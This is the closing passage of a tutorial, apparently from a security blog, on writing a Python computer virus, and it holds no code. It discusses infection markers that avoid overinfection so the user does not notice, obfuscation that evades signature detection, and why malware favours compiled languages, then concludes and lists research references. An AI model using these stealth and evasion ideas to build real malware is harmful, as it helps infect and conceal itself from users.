On the other hand, if the virus does not have this mechanism, you may have problems with overinfection. This is because 
the virus can infect the same file multiple times. Overinfection of one or more files results in the user perceiving a 
worse performance when running a program (after all, if you run an infected program several times, it will take time to 
perform the legitimate functionality as the code will also run of various infections), along with a loss of space in 
secondary memory. This lack of performance and space will make the user think that something is wrong, causing him to 
repair the computer and therefore stop the infection.

The way in which the virus will detect whether a file is infected or not is very important when creating it, as it will 
determine its own virulence, so whenever a virus develops this issue must be kept in mind.

## Protections used
The protections used (code encryption and “pass” insertion) are aimed at evading signature detection. If a detection 
technique is applied using a heuristic analysis or behavioral analysis you will end up discovering that this program is 
a virus.

It should be clarified that when a code is obscured in a compiled language, assembler instructions will be encrypted, 
so the implementation of this technique will be far from what is proposed here.

## Language
Viruses (or any type of malware) are usually built in compiled languages to avoid external dependencies. Using Python 
reduces the ability to infect of the created viruses, as it will only be effective on computers that have the language 
installed and with the correct version.

# Conclusions
This publication has seen how a virus works along with some of its defense mechanisms, and this whole process is more 
complex than explained, as in this field there are many more forms of infection and protection.

Maybe in the future other topics will be addressed in Hackliza such as the creation of a worm, the operation of a 
cavity or a rookit, but for now we will have to wait.

# References
Filiol, E. (2004). _Computer viruses: from theory to application_ (1st ed.). Springer

Szor, P. (2005). _The Art of Computer Virus Researchand Defense_ (1st ed.). Addison Wesley Professional

[Writing Viruses for Fun, not Profit](https://www.youtube.com/watch?v=2Ra1CCG8Guo)

[Computer Virus Strategies and Detection Methods](https://www.emis.de/journals/IJOPCM/files/IJOPCM(vol.1.2.3.S.8).pdf)

[Malware development part 1](https://0xpat.github.io/Malware_development_part_1/)
